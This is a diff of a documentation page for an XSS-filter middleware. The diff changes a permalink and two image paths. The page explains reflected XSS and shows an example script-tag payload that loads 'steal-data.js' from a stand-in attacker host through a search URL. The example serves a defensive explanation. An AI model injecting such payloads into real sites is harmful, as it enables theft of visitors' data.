@@ -1,7 +1,7 @@
 ---
 layout: page
 title: XSS Filter
-permalink: /xss-filter/
+permalink: /middleware/xss-filter/
 ---
 In short, the `xssFilter` middleware sets the `X-XSS-Protection` header to prevent reflected XSS attacks.
 
@@ -24,7 +24,7 @@ https://goober.example.com/search?query=javascript+jokes
 
 The search results might look like the screenshot below. Notice how the text appears right on the page:
 
-![Screenshot of normal Goober search](/xss-filter/xss-filter-ok.png)
+![Screenshot of normal Goober search](xss-filter-ok.png)
 
 What if we could search for something like `<script src="http://evil.example.com/steal-data.js"></script>`? That URL would look like this:
 
@@ -34,7 +34,7 @@ https://goober.example.com/search?query=<script%20src="http://evil.example.com/s
 
 And here's how it would appear on your page:
 
-![Screenshot of malicious Goober search](/xss-filter/xss-filter-malicious.png)
+![Screenshot of malicious Goober search](xss-filter-malicious.png)
 
 Suddenly, a malicious JavaScript file was executed just because you visited a URL! That's not good.
 
